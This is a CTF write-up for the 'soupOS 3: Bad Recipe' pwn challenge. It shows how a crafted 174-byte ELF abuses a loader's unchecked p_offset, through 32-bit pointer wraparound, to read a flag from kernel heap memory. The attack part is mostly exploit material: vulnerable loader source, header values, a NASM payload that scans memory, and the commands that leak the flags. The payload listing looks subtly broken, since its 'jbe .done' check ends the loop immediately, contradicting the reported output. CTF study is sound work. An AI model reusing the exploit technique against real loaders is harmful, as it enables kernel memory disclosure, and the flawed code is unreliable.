# soupOS 3: Bad Recipe - Rev Eng pwn (498 points)

**Flag:** `cdctf{bad_recipe_the_loader_reads_wide}` · **Points:** 498 · **Author:** soup (CDCTF)
**Handout:** `soupos-handout.tar.gz` + `symbols.txt` (shared by the whole chain)

## Challenge

"Somewhere in kernel memory is a string that is never written to disk. Build a binary that convinces the
loader to hand it to you." There is no upload: `/unhex.elf` turns hex text into raw bytes, `jot` is the
editor, work in `/prep`, and `cook` needs absolute paths.

## Analysis

The flag is `kmalloc`'d and pinned on the heap, never written to disk:

```c
g_stage3 = (char *)kmalloc(64);
strcpy(g_stage3, FLAG3);
klog("[chal] stage3 flag pinned at %p\n", (void *)g_stage3);
```

The boot log prints `[chal] stage3 flag pinned at 0x17600c`, and `symbols.txt` has
`00176000 b heap_arena` - an 8 MB `.bss` array, so the flag sits in mapped kernel memory. `paging_init`
identity-maps all 127 MB, so **reading** that range never faults; the whole problem is making the kernel
copy it to us.

The broken link is in `usermode.c`:

```c
static int load_segment(const uint8_t *buf, uint32_t bufsz, const elf32_phdr_t *ph) {
    ...
    if (va_end <= va_start) return -1;                       /* wrapped */
    if (ph->p_vaddr < USER_LO) return -1;
    if (va_end > USER_HI)      return -1;
#ifdef NO_CHALLENGE
    if (ph->p_offset > bufsz) return -1;
    if (ph->p_filesz > bufsz - ph->p_offset) return -1;
#else
    /* CHALLENGE=1: p_offset is deliberately NOT validated. */
    (void)bufsz;
#endif
    ...
    memcpy((void *)ph->p_vaddr, buf + ph->p_offset, ph->p_filesz);
```

The loader checks the **destination** (`p_vaddr`, `p_memsz`, with overflow protection) but never the
**source** (`p_offset`) - the `NO_CHALLENGE` build does check it, the tournament build does not. `buf` is
`kmalloc(MAX_ELF)` with `MAX_ELF = 256 * 1024`, and `buf + p_offset` is 32-bit pointer arithmetic, so a
large enough `p_offset` **wraps below the entire heap**.

## Approaches tried

1. **Reading a flag file through soupyc** - there is no flag file; that is the point of stage 3.
2. **Pointing `p_vaddr` at `0x17600c` so memcpy writes into the kernel** - `p_vaddr` is confined to
   `USER_LO..USER_HI` (`0xC0000000..0xC8000000`), and for an already-mapped kernel page `map_user_page`
   returns "already backed", which the source comment explicitly names as the thing it now rejects.
3. **A positive `p_offset` beyond `bufsz` (no wrap)** - lands in heap above the buffer; it does read
   kernel memory but does not cover the flag, which is *below* `buf`. Both windows were actually run in
   the harness (Step 1), so this was measured, not assumed.
4. **Uploading a binary** - no upload channel; everything must be typed as hex through `jot` +
   `/unhex.elf`.

## Solution

**Step 1 - build the ELF and prove it locally first.** `analysis/build_elf.py` produces the exact 174-byte
file, **replays the real `load_segment` predicate**, and runs an i386 micro-VM over the resulting image with
three scenarios:

```text
  buf=0xfff00000 WRAP -1MB   pages=512 flag_image_off=0x10000c (in window) hits=1 [b'cdctf{...}']
  buf=0x00000000 NO WRAP (negative control)                       hits=0
  buf=0xfff00000 WRAP, flag absent (negative control)             hits=0
ALL SCENARIOS OK
```

The window must **wrap below the buffer** (control 1), and if the flag is not planted in that window the
payload must print nothing (control 2) - two controls for the local harness. They do not replace verification on the VM.

**Step 2 - sizing the window.** `p_offset = 0xFFF00000` ⇒ `read_from = (buf + 0xFFF00000) & 0xFFFFFFFF`,
i.e. `buf − 1 MB`. With `p_filesz = p_memsz = 0x200000` (2 MB) the program image spans `buf − 1 MB` to
`buf + 1 MB`, placed at `p_vaddr = 0xC0000000`:

| field | value | meaning |
|---|---|---|
| `e_entry` | `0xC0100054` | our code is at file offset 84, and the file begins at `0xC0100000` inside the image |
| `p_offset` | `0xFFF00000` | `buf − 1 MB` (32-bit wrap) |
| `p_vaddr` | `0xC0000000` | inside `USER_LO..USER_HI` |
| `p_filesz = p_memsz` | `0x200000` | 2 MB window: 1 MB of kernel below the buffer + 1 MB above |
| `p_flags` | `7` | RWX |

The window contains `heap_arena = 0x176000` for the three `buf` addresses tested by the harness. Confirm the buffer placement when reproducing on another layout; three test cases do not establish this for every allocation.

**Step 3 - the 90-byte payload (ring 3, `int 0x80` only).** Walk the 1 MB below the image for the dword
`0x74636463` ("cdct"), write 48 bytes at each hit, then a `\n`:

```nasm
mov dword [0xc0180000], 10      ; a '\n' byte parked there, the second write reads it
xor esi, esi
.loop:
cmp esi, 0x100000
jbe .done                        ; scan only the 1 MB below
mov eax, [esi+0xc0000000]
cmp eax, 0x74636463              ; "cdct"
...
mov edx, 48
mov ebx, 1
mov eax, 1                       ; sys_write(1, ptr, 48)
int 0x80
add esi, 4
jmp .loop
.done:
xor eax, eax
xor ebx, ebx
int 0x80                         ; sys_exit(0)
```

Scanning detail: **the comparison itself is data** - scanning all 2 MB makes the payload's own
`cmp eax,0x74636463` match the pattern, so the loop is bounded to the 1 MB below the buffer to avoid a
self-hit.

**Step 4 - shipping it without an upload channel.** `jot /prep/LEAK.HEX` opens the editor, type 11 hex
lines (32 characters each, kept in `files/leak.hex.txt`), `Ctrl+S`, `Esc`; `/unhex.elf` converts hex to raw
bytes and **the byte count it prints is the integrity check** (174 bytes are expected; a correct length alone does not validate every hex digit):

```text
cook@soupOS:/> cook /unhex.elf /prep/LEAK.HEX /prep/LEAK.ELF
unhex: wrote 174 bytes
cook@soupOS:/> cook /prep/LEAK.ELF
cdctf{bad_recipe_the_loader_reads_wide}
cdctf{mise_en_place_two_paths_one_check}
```

The second line is stage 1's FLAG1: it lives in `.rodata`, so it also fell inside the window - independent
proof that the primitive really read kernel memory rather than a file.

## Result

```text
cdctf{bad_recipe_the_loader_reads_wide}
```

## Reproduce

```bash
# local: build the ELF and run the three scenarios (1 positive, 2 negative)
python3 analysis/build_elf.py            # writes leak.elf and leak.hex.txt

# on the box: jot -> type the 11 hex lines -> cook /unhex.elf -> cook /prep/LEAK.ELF
cook /unhex.elf /prep/LEAK.HEX /prep/LEAK.ELF   # must print "unhex: wrote 174 bytes"
cook /prep/LEAK.ELF
```
